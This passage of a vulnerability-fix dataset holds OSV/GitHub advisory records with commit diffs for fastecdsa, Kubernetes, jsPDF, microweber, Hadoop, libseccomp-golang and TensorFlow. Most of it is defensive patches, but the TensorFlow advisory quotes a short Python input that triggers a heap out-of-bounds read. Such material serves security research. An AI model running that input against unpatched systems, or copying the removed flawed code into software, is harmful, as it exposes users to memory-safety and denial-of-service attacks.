if(pointZZ_pIsIdentityElement(point)) {\\n+        return pointZZ_pSetToIdentityElement(rop);\\n+    }\\n+\\n     PointZZ_p R0, R1, tmp;\\n     mpz_inits(R1.x, R1.y, tmp.x, tmp.y, NULL);\\n     mpz_init_set(R0.x, point->x);'}}","message_norm":"properly handle the point at infinity","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/curveMath.c'])","num_files":1.0},{"index":567,"vuln_id":"GHSA-56wv-2wr9-3h9r","cwe_id":"{'CWE-347'}","score":7.5,"chain":"{'https:\/\/github.com\/AntonKueltz\/fastecdsa\/commit\/e592f106edd5acf6dacedfab2ad16fe6c735c9d1', 'https:\/\/github.com\/AntonKueltz\/fastecdsa\/commit\/7b64e3efaa806b4daaf73bb5172af3581812f8de', 'https:\/\/github.com\/AntonKueltz\/fastecdsa\/commit\/4a16daeaf139be20654ef58a9fe4c79dc030458c'}","dataset":"osv","summary":"Improper Verification of Cryptographic Signature in fastecdsa An issue was discovered in fastecdsa before 2.1.2. When using the NIST P-256 curve in the ECDSA implementation, the point at infinity is mishandled. This means that for an extreme value in k and s^-1, the signature verification fails even if the signature is correct. This behavior is not solely a usability problem. There are some threat models where an attacker can benefit by successfully guessing users for whom signature verification will fail.","published_date":"2021-10-12","chain_len":3,"project":"https:\/\/github.com\/AntonKueltz\/fastecdsa","commit_href":"https:\/\/github.com\/AntonKueltz\/fastecdsa\/commit\/7b64e3efaa806b4daaf73bb5172af3581812f8de","commit_sha":"7b64e3efaa806b4daaf73bb5172af3581812f8de","patch":"MULTI","chain_ord":"['e592f106edd5acf6dacedfab2ad16fe6c735c9d1', '7b64e3efaa806b4daaf73bb5172af3581812f8de', '4a16daeaf139be20654ef58a9fe4c79dc030458c']","before_first_fix_commit":"{'7b64e3efaa806b4daaf73bb5172af3581812f8de'}","last_fix_commit":"4a16daeaf139be20654ef58a9fe4c79dc030458c","chain_ord_pos":2.0,"commit_datetime":"04\/14\/2020, 09:45:48","message":"Update docs to v2.1.2","author":"AntonKueltz","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'docs\/conf.py': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/AntonKueltz\/fastecdsa\/raw\/7b64e3efaa806b4daaf73bb5172af3581812f8de\/docs%2Fconf.py', 'patch': \"@@ -64,7 +64,7 @@\\n # The short X.Y version.\\n version = '2.1'\\n # The full version, including alpha\/beta\/rc tags.\\n-release = '2.1.1'\\n+release = '2.1.2'\\n \\n # The language for content autogenerated by Sphinx. Refer to documentation\\n # for a list of supported languages.\"}}","message_norm":"update docs to v2.1.2","language":"sl","entities":"[('v2.1.2', 'VERSION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['docs\/conf.py'])","num_files":1.0},{"index":568,"vuln_id":"GHSA-56wv-2wr9-3h9r","cwe_id":"{'CWE-347'}","score":7.5,"chain":"{'https:\/\/github.com\/AntonKueltz\/fastecdsa\/commit\/e592f106edd5acf6dacedfab2ad16fe6c735c9d1', 'https:\/\/github.com\/AntonKueltz\/fastecdsa\/commit\/7b64e3efaa806b4daaf73bb5172af3581812f8de', 'https:\/\/github.com\/AntonKueltz\/fastecdsa\/commit\/4a16daeaf139be20654ef58a9fe4c79dc030458c'}","dataset":"osv","summary":"Improper Verification of Cryptographic Signature in fastecdsa An issue was discovered in fastecdsa before 2.1.2. When using the NIST P-256 curve in the ECDSA implementation, the point at infinity is mishandled. This means that for an extreme value in k and s^-1, the signature verification fails even if the signature is correct. This behavior is not solely a usability problem. There are some threat models where an attacker can benefit by successfully guessing users for whom signature verification will fail.","published_date":"2021-10-12","chain_len":3,"project":"https:\/\/github.com\/AntonKueltz\/fastecdsa","commit_href":"https:\/\/github.com\/AntonKueltz\/fastecdsa\/commit\/4a16daeaf139be20654ef58a9fe4c79dc030458c","commit_sha":"4a16daeaf139be20654ef58a9fe4c79dc030458c","patch":"MULTI","chain_ord":"['e592f106edd5acf6dacedfab2ad16fe6c735c9d1', '7b64e3efaa806b4daaf73bb5172af3581812f8de', '4a16daeaf139be20654ef58a9fe4c79dc030458c']","before_first_fix_commit":"{'7b64e3efaa806b4daaf73bb5172af3581812f8de'}","last_fix_commit":"4a16daeaf139be20654ef58a9fe4c79dc030458c","chain_ord_pos":3.0,"commit_datetime":"04\/14\/2020, 09:52:44","message":"Update CHANGELOG.md","author":"AntonKueltz","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'CHANGELOG.md': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/AntonKueltz\/fastecdsa\/raw\/4a16daeaf139be20654ef58a9fe4c79dc030458c\/CHANGELOG.md', 'patch': \"@@ -2,7 +2,7 @@\\n \\n ## [2.1.2]\\n ### Fixed\\n-- Point at infinity handling in C extensions\\n+- Point at infinity handling in C extensions (issue #52)\\n - DER signature decoding that assumed length was always encoded in one byte\\n \\n ## [2.1.1]\\n@@ -28,4 +28,4 @@\\n - Various unused imports\\n \\n ### Fixed\\n-- Issue with benchmark script when C extensions weren't built in place (issue #44)\\n\\\\ No newline at end of file\\n+- Issue with benchmark script when C extensions weren't built in place (issue #44)\"}}","message_norm":"update changelog.md","language":"nl","entities":"[('update', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['CHANGELOG.md'])","num_files":1.0},{"index":571,"vuln_id":"GHSA-579h-mv94-g4gp","cwe_id":"{'CWE-269'}","score":9.8,"chain":"{'https:\/\/github.com\/kubernetes\/kubernetes\/commit\/2257c1ecbe3c0cf71dd50b82752ae189c94ec905'}","dataset":"osv","summary":"Privilege Escalation in Kubernetes In all Kubernetes versions prior to v1.10.11, v1.11.5, and v1.12.3, incorrect handling of error responses to proxied upgrade requests in the kube-apiserver allowed specially crafted requests to establish a connection through the Kubernetes API server to backend servers, then send arbitrary requests over the same connection directly to the backend, authenticated with the Kubernetes API server's TLS credentials used to establish the backend connection.","published_date":"2022-02-15","chain_len":1,"project":"https:\/\/github.com\/kubernetes\/kubernetes","commit_href":"https:\/\/github.com\/kubernetes\/kubernetes\/commit\/2257c1ecbe3c0cf71dd50b82752ae189c94ec905","commit_sha":"2257c1ecbe3c0cf71dd50b82752ae189c94ec905","patch":"SINGLE","chain_ord":"['2257c1ecbe3c0cf71dd50b82752ae189c94ec905']","before_first_fix_commit":"{'b84e3dd6f80af4016acfd891ef6cc50ce05d4b5b', '396271cf52af70bc96ed378dd9ce1a865cc99647'}","last_fix_commit":"2257c1ecbe3c0cf71dd50b82752ae189c94ec905","chain_ord_pos":1.0,"commit_datetime":"11\/26\/2018, 12:26:22","message":"Merge pull request #71412 from liggitt\/backend-error\n\nHandle error responses from backends","author":"k8s-ci-robot","comments":null,"stats":"{'additions': 37, 'deletions': 0, 'total': 37}","files":"{'staging\/src\/k8s.io\/apimachinery\/pkg\/util\/proxy\/upgradeaware.go': {'additions': 37, 'deletions': 0, 'changes': 37, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/kubernetes\/kubernetes\/raw\/2257c1ecbe3c0cf71dd50b82752ae189c94ec905\/staging%2Fsrc%2Fk8s.io%2Fapimachinery%2Fpkg%2Futil%2Fproxy%2Fupgradeaware.go', 'patch': '@@ -17,6 +17,7 @@ limitations under the License.\\n package proxy\\n \\n import (\\n+\\t\"bufio\"\\n \\t\"bytes\"\\n \\t\"context\"\\n \\t\"fmt\"\\n@@ -271,6 +272,18 @@ func (h *UpgradeAwareHandler) tryUpgrade(w http.ResponseWriter, req *http.Reques\\n \\t}\\n \\tdefer backendConn.Close()\\n \\n+\\t\/\/ determine the http response code from the backend by reading from rawResponse+backendConn\\n+\\trawResponseCode, headerBytes, err := getResponseCode(io.MultiReader(bytes.NewReader(rawResponse), backendConn))\\n+\\tif err != nil {\\n+\\t\\tklog.V(6).Infof(\"Proxy connection error: %v\", err)\\n+\\t\\th.Responder.Error(w, req, err)\\n+\\t\\treturn true\\n+\\t}\\n+\\tif len(headerBytes) > len(rawResponse) {\\n+\\t\\t\/\/ we read beyond the bytes stored in rawResponse, update rawResponse to the full set of bytes read from the backend\\n+\\t\\trawResponse = headerBytes\\n+\\t}\\n+\\n \\t\/\/ Once the connection is hijacked, the ErrorResponder will no longer work, so\\n \\t\/\/ hijacking should be the last step in the upgrade.\\n \\trequestHijacker, ok := w.(http.Hijacker)\\n@@ -295,6 +308,17 @@ func (h *UpgradeAwareHandler) tryUpgrade(w http.ResponseWriter, req *http.Reques\\n \\t\\t}\\n \\t}\\n \\n+\\tif rawResponseCode != http.StatusSwitchingProtocols {\\n+\\t\\t\/\/ If the backend did not upgrade the request, finish echoing the response from the backend to the client and return, closing the connection.\\n+\\t\\tklog.V(6).Infof(\"Proxy upgrade error, status code %d\", rawResponseCode)\\n+\\t\\t_, err := io.Copy(requestHijackedConn, backendConn)\\n+\\t\\tif err != nil && !strings.Contains(err.Error(), \"use of closed network connection\") {\\n+\\t\\t\\tklog.Errorf(\"Error proxying data from backend to client: %v\", err)\\n+\\t\\t}\\n+\\t\\t\/\/ Indicate we handled the request\\n+\\t\\treturn true\\n+\\t}\\n+\\n \\t\/\/ Proxy the connection. This is bidirectional, so we need a goroutine\\n \\t\/\/ to copy in each direction. Once one side of the connection exits, we\\n \\t\/\/ exit the function which performs cleanup and in the process closes\\n@@ -356,6 +380,19 @@ func (h *UpgradeAwareHandler) DialForUpgrade(req *http.Request) (net.Conn, error\\n \\treturn dial(updatedReq, h.UpgradeTransport)\\n }\\n \\n+\/\/ getResponseCode reads a http response from the given reader, returns the status code,\\n+\/\/ the bytes read from the reader, and any error encountered\\n+func getResponseCode(r io.Reader) (int, []byte, error) {\\n+\\trawResponse := bytes.NewBuffer(make([]byte, 0, 256))\\n+\\t\/\/ Save the bytes read while reading the response headers into the rawResponse buffer\\n+\\tresp, err := http.ReadResponse(bufio.NewReader(io.TeeReader(r, rawResponse)), nil)\\n+\\tif err != nil {\\n+\\t\\treturn 0, nil, err\\n+\\t}\\n+\\t\/\/ return the http status code and the raw bytes consumed from the reader in the process\\n+\\treturn resp.StatusCode, rawResponse.Bytes(), nil\\n+}\\n+\\n \/\/ dial dials the backend at req.URL and writes req to it.\\n func dial(req *http.Request, transport http.RoundTripper) (net.Conn, error) {\\n \\tconn, err := DialURL(req.Context(), req.URL, transport)'}}","message_norm":"merge pull request #71412 from liggitt\/backend-error\n\nhandle error responses from backends","language":"no","entities":"[('#71412', 'ISSUE', ''), ('error', 'FLAW', ''), ('error', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['staging\/src\/k8s.io\/apimachinery\/pkg\/util\/proxy\/upgradeaware.go'])","num_files":1.0},{"index":573,"vuln_id":"GHSA-57f3-gghm-9mhc","cwe_id":"{'CWE-400'}","score":7.5,"chain":"{'https:\/\/github.com\/MrRio\/jsPDF\/commit\/d8bb3b39efcd129994f7a3b01b632164144ec43e'}","dataset":"osv","summary":"Regular Expression Denial of Service (ReDoS) This affects the package jspdf before 2.3.1. ReDoS is possible via the addImage function.","published_date":"2021-03-12","chain_len":1,"project":"https:\/\/github.com\/MrRio\/jsPDF","commit_href":"https:\/\/github.com\/MrRio\/jsPDF\/commit\/d8bb3b39efcd129994f7a3b01b632164144ec43e","commit_sha":"d8bb3b39efcd129994f7a3b01b632164144ec43e","patch":"SINGLE","chain_ord":"['d8bb3b39efcd129994f7a3b01b632164144ec43e']","before_first_fix_commit":"{'c91995de97c598deaf6fda7109ea886a50f50109'}","last_fix_commit":"d8bb3b39efcd129994f7a3b01b632164144ec43e","chain_ord_pos":1.0,"commit_datetime":"02\/11\/2021, 15:50:17","message":"fix ReDoS-vulnerable regexp in addImage (#3091)","author":"Yeting Li","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'src\/modules\/addimage.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/parallax\/jsPDF\/raw\/d8bb3b39efcd129994f7a3b01b632164144ec43e\/src%2Fmodules%2Faddimage.js', 'patch': '@@ -630,7 +630,7 @@ import { atob, btoa } from \"..\/libs\/AtobBtoa.js\";\\n     var result = null;\\n \\n     if (dataUrlParts.length === 2) {\\n-      var extractedInfo = \/^data:(\\\\w*\\\\\/\\\\w*);*(charset=[\\\\w=-]*)*;*$\/.exec(\\n+      var extractedInfo = \/^data:(\\\\w*\\\\\/\\\\w*);*(charset=(?!charset=)[\\\\w=-]*)*;*$\/.exec(\\n         dataUrlParts[0]\\n       );\\n       if (Array.isArray(extractedInfo)) {'}}","message_norm":"fix redos-vulnerable regexp in addimage (#3091)","language":"en","entities":"[('fix', 'ACTION', ''), ('redos', 'SECWORD', ''), ('vulnerable', 'SECWORD', ''), ('#3091', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/modules\/addimage.js'])","num_files":1.0},{"index":585,"vuln_id":"GHSA-5875-p652-2ppm","cwe_id":"{'CWE-668'}","score":4.3,"chain":"{'https:\/\/github.com\/microweber\/microweber\/commit\/76361264d9fdfff38a1af79c63141455cc4d36e3'}","dataset":"osv","summary":"Exposure of Resource to Wrong Sphere in microweber Exposure of Resource to Wrong Sphere in microweber prior to 1.3 allows users to add deleted products to a cart and buy it.","published_date":"2022-02-27","chain_len":1,"project":"https:\/\/github.com\/microweber\/microweber","commit_href":"https:\/\/github.com\/microweber\/microweber\/commit\/76361264d9fdfff38a1af79c63141455cc4d36e3","commit_sha":"76361264d9fdfff38a1af79c63141455cc4d36e3","patch":"SINGLE","chain_ord":"['76361264d9fdfff38a1af79c63141455cc4d36e3']","before_first_fix_commit":"{'cc5947c83f05f5490c9190d4a68dc199461b34e3'}","last_fix_commit":"76361264d9fdfff38a1af79c63141455cc4d36e3","chain_ord_pos":1.0,"commit_datetime":"02\/25\/2022, 09:43:45","message":"check product is deleted before add to cart","author":"Bozhidar Slaveykov","comments":null,"stats":"{'additions': 14, 'deletions': 0, 'total': 14}","files":"{'src\/MicroweberPackages\/Cart\/CartManager.php': {'additions': 14, 'deletions': 0, 'changes': 14, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/microweber\/microweber\/raw\/76361264d9fdfff38a1af79c63141455cc4d36e3\/src%2FMicroweberPackages%2FCart%2FCartManager.php', 'patch': \"@@ -565,7 +565,21 @@ public function update_cart($data)\\n         }\\n \\n         if ($data['for'] == 'content') {\\n+\\n             $cont = $this->app->content_manager->get_by_id($for_id);\\n+\\n+            if (isset($cont['is_active'])) {\\n+                if ($cont['is_active'] != 1) {\\n+                    $cont = false;\\n+                }\\n+            }\\n+\\n+            if (isset($cont['is_deleted'])) {\\n+                if ($cont['is_deleted'] > 0) {\\n+                    $cont = false;\\n+                }\\n+            }\\n+\\n             $cont_data = $this->app->content_manager->data($for_id);\\n             if ($cont == false) {\\n                 return array('error' => 'Invalid product?');\"}}","message_norm":"check product is deleted before add to cart","language":"en","entities":null,"classification_level_1":"POORLY_DOCUMENTED","classification_level_2":"REDUNDANT_MESSAGE","list_files":"dict_keys(['src\/MicroweberPackages\/Cart\/CartManager.php'])","num_files":1.0},{"index":590,"vuln_id":"GHSA-58jx-f5rf-qgqf","cwe_id":"{'CWE-22', 'CWE-502'}","score":8.8,"chain":"{'https:\/\/github.com\/apache\/hadoop\/commit\/ba041fe6d34215f075e0a7b2078d7273147e14b7', 'https:\/\/github.com\/apache\/hadoop\/commit\/227d64ab59e8aa6477769b2542ad0cd7a6d855cb', 'https:\/\/github.com\/apache\/hadoop\/commit\/45801fba8b00257ab32c02a7d1a05948ba687a49'}","dataset":"osv","summary":"User account escalation in Apache Hadoop In Apache Hadoop 2.2.0 to 2.10.1, 3.0.0-alpha1 to 3.1.4, 3.2.0 to 3.2.2, and 3.3.0 to 3.3.1, a user who can escalate to yarn user can possibly run arbitrary commands as root user. Users should upgrade to Apache Hadoop 2.10.2, 3.2.3, 3.3.2 or higher.","published_date":"2022-06-16","chain_len":3,"project":"https:\/\/github.com\/apache\/hadoop","commit_href":"https:\/\/github.com\/apache\/hadoop\/commit\/227d64ab59e8aa6477769b2542ad0cd7a6d855cb","commit_sha":"227d64ab59e8aa6477769b2542ad0cd7a6d855cb","patch":"MULTI","chain_ord":"['ba041fe6d34215f075e0a7b2078d7273147e14b7', '45801fba8b00257ab32c02a7d1a05948ba687a49', '227d64ab59e8aa6477769b2542ad0cd7a6d855cb']","before_first_fix_commit":"{'ba041fe6d34215f075e0a7b2078d7273147e14b7'}","last_fix_commit":"227d64ab59e8aa6477769b2542ad0cd7a6d855cb","chain_ord_pos":3.0,"commit_datetime":"05\/24\/2022, 05:07:19","message":"YARN-11162. Set the zk acl for nodes created by ZKConfigurationStore. (#4350)\n\n(cherry picked from commit f390edaec44cfa91b2b09549091f033f1749d8ac)\n\nConflicts:\n\thadoop-yarn-project\/hadoop-yarn\/hadoop-yarn-server\/hadoop-yarn-server-resourcemanager\/src\/main\/java\/org\/apache\/hadoop\/yarn\/server\/resourcemanager\/scheduler\/capacity\/conf\/ZKConfigurationStore.java\n\n(cherry picked from commit 88a8752fa2ba0c70b0df94a78eb9fd86b965acd5)","author":"Owen O'Malley","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'hadoop-yarn-project\/hadoop-yarn\/hadoop-yarn-server\/hadoop-yarn-server-resourcemanager\/src\/main\/java\/org\/apache\/hadoop\/yarn\/server\/resourcemanager\/scheduler\/capacity\/conf\/ZKConfigurationStore.java': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/apache\/hadoop\/raw\/227d64ab59e8aa6477769b2542ad0cd7a6d855cb\/hadoop-yarn-project%2Fhadoop-yarn%2Fhadoop-yarn-server%2Fhadoop-yarn-server-resourcemanager%2Fsrc%2Fmain%2Fjava%2Forg%2Fapache%2Fhadoop%2Fyarn%2Fserver%2Fresourcemanager%2Fscheduler%2Fcapacity%2Fconf%2FZKConfigurationStore.java', 'patch': '@@ -97,13 +97,13 @@ public void initialize(Configuration config, Configuration schedConf,\\n     zkManager.delete(fencingNodePath);\\n \\n     if (!zkManager.exists(logsPath)) {\\n-      zkManager.create(logsPath);\\n+      zkManager.create(logsPath, zkAcl);\\n       zkManager.setData(logsPath,\\n           serializeObject(new LinkedList<LogMutation>()), -1);\\n     }\\n \\n     if (!zkManager.exists(confStorePath)) {\\n-      zkManager.create(confStorePath);\\n+      zkManager.create(confStorePath, zkAcl);\\n       HashMap<String, String> mapSchedConf = new HashMap<>();\\n       for (Map.Entry<String, String> entry : schedConf) {\\n         mapSchedConf.put(entry.getKey(), entry.getValue());'}}","message_norm":"yarn-11162. set the zk acl for nodes created by zkconfigurationstore. (#4350)\n\n(cherry picked from commit f390edaec44cfa91b2b09549091f033f1749d8ac)\n\nconflicts:\n\thadoop-yarn-project\/hadoop-yarn\/hadoop-yarn-server\/hadoop-yarn-server-resourcemanager\/src\/main\/java\/org\/apache\/hadoop\/yarn\/server\/resourcemanager\/scheduler\/capacity\/conf\/zkconfigurationstore.java\n\n(cherry picked from commit 88a8752fa2ba0c70b0df94a78eb9fd86b965acd5)","language":"en","entities":"[('#4350', 'ISSUE', ''), ('commit f390edaec44cfa91b2b09549091f033f1749d8ac', 'SHA', 'prefix_sha'), ('server', 'SECWORD', ''), ('server', 'SECWORD', ''), ('server', 'SECWORD', ''), ('commit 88a8752fa2ba0c70b0df94a78eb9fd86b965acd5', 'SHA', 'prefix_colon_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['hadoop-yarn-project\/hadoop-yarn\/hadoop-yarn-server\/hadoop-yarn-server-resourcemanager\/src\/main\/java\/org\/apache\/hadoop\/yarn\/server\/resourcemanager\/scheduler\/capacity\/conf\/ZKConfigurationStore.java'])","num_files":1.0},{"index":593,"vuln_id":"GHSA-58v3-j75h-xr49","cwe_id":"{'CWE-284'}","score":4.8,"chain":"{'https:\/\/github.com\/seccomp\/libseccomp-golang\/commit\/06e7a29f36a34b8cf419aeb87b979ee508e58f9e'}","dataset":"osv","summary":"Improper Input Validation in libseccomp-golang libseccomp-golang 0.9.0 and earlier incorrectly generates BPFs that OR multiple arguments rather than ANDing them. A process running under a restrictive seccomp filter that specified multiple syscall arguments could bypass intended access restrictions by specifying a single matching argument.","published_date":"2021-05-18","chain_len":1,"project":"https:\/\/github.com\/seccomp\/libseccomp-golang","commit_href":"https:\/\/github.com\/seccomp\/libseccomp-golang\/commit\/06e7a29f36a34b8cf419aeb87b979ee508e58f9e","commit_sha":"06e7a29f36a34b8cf419aeb87b979ee508e58f9e","patch":"SINGLE","chain_ord":"['06e7a29f36a34b8cf419aeb87b979ee508e58f9e']","before_first_fix_commit":"{'fc0298087f328ac97a1fa781392de96b2ebb8aac'}","last_fix_commit":"06e7a29f36a34b8cf419aeb87b979ee508e58f9e","chain_ord_pos":1.0,"commit_datetime":"04\/19\/2017, 20:28:29","message":"golang: Resolve bug with handling of multiple argument rules\n\nIn the upstream library, when added with a single API call,\nmultiple syscall argument rules should be matched with AND\nlogic - if all of them match, the rule matches.\n\nAt present, the Golang bindings apply OR logic to this case.\nThis commit resolves this and reverts to the behavior of the\nmain library.\n\nSigned-off-by: Matthew Heon <matthew.heon@gmail.com>","author":"Matthew Heon","comments":null,"stats":"{'additions': 37, 'deletions': 27, 'total': 64}","files":"{'seccomp_internal.go': {'additions': 37, 'deletions': 27, 'changes': 64, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/seccomp\/libseccomp-golang\/raw\/06e7a29f36a34b8cf419aeb87b979ee508e58f9e\/seccomp_internal.go', 'patch': '@@ -120,23 +120,27 @@ unsigned int get_micro_version()\\n \\n typedef struct scmp_arg_cmp* scmp_cast_t;\\n \\n-\/\/ Wrapper to create an scmp_arg_cmp struct\\n-void*\\n-make_struct_arg_cmp(\\n-                    unsigned int arg,\\n-                    int compare,\\n-                    uint64_t a,\\n-                    uint64_t b\\n-                   )\\n+void* make_arg_cmp_array(unsigned int length)\\n {\\n-\\tstruct scmp_arg_cmp *s = malloc(sizeof(struct scmp_arg_cmp));\\n+        return calloc(length, sizeof(struct scmp_arg_cmp));\\n+}\\n \\n-\\ts->arg = arg;\\n-\\ts->op = compare;\\n-\\ts->datum_a = a;\\n-\\ts->datum_b = b;\\n+\/\/ Wrapper to add an scmp_arg_cmp struct to an existing arg_cmp array\\n+void add_struct_arg_cmp(\\n+                        struct scmp_arg_cmp* arr,\\n+                        unsigned int pos,\\n+                        unsigned int arg,\\n+                        int compare,\\n+                        uint64_t a,\\n+                        uint64_t b\\n+                       )\\n+{\\n+        arr[pos].arg = arg;\\n+        arr[pos].op = compare;\\n+        arr[pos].datum_a = a;\\n+        arr[pos].datum_b = b;\\n \\n-\\treturn s;\\n+        return;\\n }\\n *\/\\n import \"C\"\\n@@ -239,12 +243,9 @@ func (f *ScmpFilter) setFilterAttr(attr scmpFilterAttr, value C.uint32_t) error\\n \/\/ DOES NOT LOCK OR CHECK VALIDITY\\n \/\/ Assumes caller has already done this\\n \/\/ Wrapper for seccomp_rule_add_... functions\\n-func (f *ScmpFilter) addRuleWrapper(call ScmpSyscall, action ScmpAction, exact bool, cond C.scmp_cast_t) error {\\n-\\tvar length C.uint\\n-\\tif cond != nil {\\n-\\t\\tlength = 1\\n-\\t} else {\\n-\\t\\tlength = 0\\n+func (f *ScmpFilter) addRuleWrapper(call ScmpSyscall, action ScmpAction, exact bool, length C.uint, cond C.scmp_cast_t) error {\\n+\\tif length != 0 && cond == nil {\\n+\\t\\treturn fmt.Errorf(\"null conditions list, but length is nonzero\")\\n \\t}\\n \\n \\tvar retCode C.int\\n@@ -258,6 +259,8 @@ func (f *ScmpFilter) addRuleWrapper(call ScmpSyscall, action ScmpAction, exact b\\n \\t\\treturn fmt.Errorf(\"unrecognized syscall\")\\n \\t} else if syscall.Errno(-1*retCode) == syscall.EPERM {\\n \\t\\treturn fmt.Errorf(\"requested action matches default action of filter\")\\n+\\t} else if syscall.Errno(-1*retCode) == syscall.EINVAL {\\n+\\t\\treturn fmt.Errorf(\"two checks on same syscall argument\")\\n \\t} else if retCode != 0 {\\n \\t\\treturn syscall.Errno(-1 * retCode)\\n \\t}\\n@@ -275,7 +278,7 @@ func (f *ScmpFilter) addRuleGeneric(call ScmpSyscall, action ScmpAction, exact b\\n \\t}\\n \\n \\tif len(conds) == 0 {\\n-\\t\\tif err := f.addRuleWrapper(call, action, exact, nil); err != nil {\\n+\\t\\tif err := f.addRuleWrapper(call, action, exact, 0, nil); err != nil {\\n \\t\\t\\treturn err\\n \\t\\t}\\n \\t} else {\\n@@ -287,13 +290,20 @@ func (f *ScmpFilter) addRuleGeneric(call ScmpSyscall, action ScmpAction, exact b\\n \\t\\t\\t}\\n \\t\\t}\\n \\n-\\t\\tfor _, cond := range conds {\\n-\\t\\t\\tcmpStruct := C.make_struct_arg_cmp(C.uint(cond.Argument), cond.Op.toNative(), C.uint64_t(cond.Operand1), C.uint64_t(cond.Operand2))\\n-\\t\\t\\tdefer C.free(cmpStruct)\\n+\\t\\targsArr := C.make_arg_cmp_array(C.uint(len(conds)))\\n+\\t\\tif argsArr == nil {\\n+\\t\\t\\treturn fmt.Errorf(\"error allocating memory for conditions\")\\n+\\t\\t}\\n+\\t\\tdefer C.free(argsArr)\\n+\\n+\\t\\tfor i, cond := range conds {\\n+\\t\\t\\tC.add_struct_arg_cmp(C.scmp_cast_t(argsArr), C.uint(i),\\n+\\t\\t\\t\\tC.uint(cond.Argument), cond.Op.toNative(),\\n+\\t\\t\\t\\tC.uint64_t(cond.Operand1), C.uint64_t(cond.Operand2))\\n+\\t\\t}\\n \\n-\\t\\t\\tif err := f.addRuleWrapper(call, action, exact, C.scmp_cast_t(cmpStruct)); err != nil {\\n-\\t\\t\\t\\treturn err\\n-\\t\\t\\t}\\n+\\t\\tif err := f.addRuleWrapper(call, action, exact, C.uint(len(conds)), C.scmp_cast_t(argsArr)); err != nil {\\n+\\t\\t\\treturn err\\n \\t\\t}\\n \\t}'}}","message_norm":"golang: resolve bug with handling of multiple argument rules\n\nin the upstream library, when added with a single api call,\nmultiple syscall argument rules should be matched with and\nlogic - if all of them match, the rule matches.\n\nat present, the golang bindings apply or logic to this case.\nthis commit resolves this and reverts to the behavior of the\nmain library.\n\nsigned-off-by: matthew heon <matthew.heon@gmail.com>","language":"en","entities":"[('bug', 'FLAW', ''), ('added', 'ACTION', ''), ('matthew.heon@gmail.com', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['seccomp_internal.go'])","num_files":1.0},{"index":604,"vuln_id":"GHSA-59q2-x2qc-4c97","cwe_id":"{'CWE-125'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/51300ba1cc2f487aefec6e6631fef03b0e08b298'}","dataset":"osv","summary":"Heap OOB access in unicode ops ### Impact\nAn attacker can access data outside of bounds of heap allocated array in `tf.raw_ops.UnicodeEncode`:\n\n```python\nimport tensorflow as tf\n\ninput_values = tf.constant([58], shape=[1], dtype=tf.int32)\ninput_splits = tf.constant([[81, 101, 0]], shape=[3], dtype=tf.int32)\noutput_encoding = \"UTF-8\"\n\ntf.raw_ops.UnicodeEncode(\n    input_values=input_values, input_splits=input_splits,\n    output_encoding=output_encoding)\n```\n\nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/472c1f12ad9063405737679d4f6bd43094e1d36d\/tensorflow\/core\/kernels\/unicode_ops.cc)\nassumes that the `input_value`\/`input_splits` pair specify a valid sparse tensor.\n\n### Patches\nWe have patched the issue in GitHub commit [51300ba1cc2f487aefec6e6631fef03b0e08b298](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/51300ba1cc2f487aefec6e6631fef03b0e08b298).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/51300ba1cc2f487aefec6e6631fef03b0e08b298","commit_sha":"51300ba1cc2f487aefec6e6631fef03b0e08b298","patch":"SINGLE","chain_ord":"['51300ba1cc2f487aefec6e6631fef03b0e08b298']","before_first_fix_commit":"{'472c1f12ad9063405737679d4f6bd43094e1d36d'}","last_fix_commit":"51300ba1cc2f487aefec6e6631fef03b0e08b298","chain_ord_pos":1.0,"commit_datetime":"05\/03\/2021, 16:53:26","message":"Fix heap buffer overflow in tf.raw_ops.UnicodeEncode.\n\nPiperOrigin-RevId: 371717714\nChange-Id: If33443b28f158e58078f1268f6b92f2728d219e0","author":"Laura Pak","comments":null,"stats":"{'additions': 19, 'deletions': 0, 'total': 19}","files":"{'tensorflow\/core\/kernels\/unicode_ops.cc': {'additions': 19, 'deletions': 0, 'changes': 19, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/51300ba1cc2f487aefec6e6631fef03b0e08b298\/tensorflow%2Fcore%2Fkernels%2Funicode_ops.cc', 'patch': '@@ -533,6 +533,17 @@ class UnicodeEncodeOp : public OpKernel {\\n     const Tensor& input_splits = context->input(1);\\n     const auto input_splits_flat = input_splits.flat<SPLITS_TYPE>();\\n 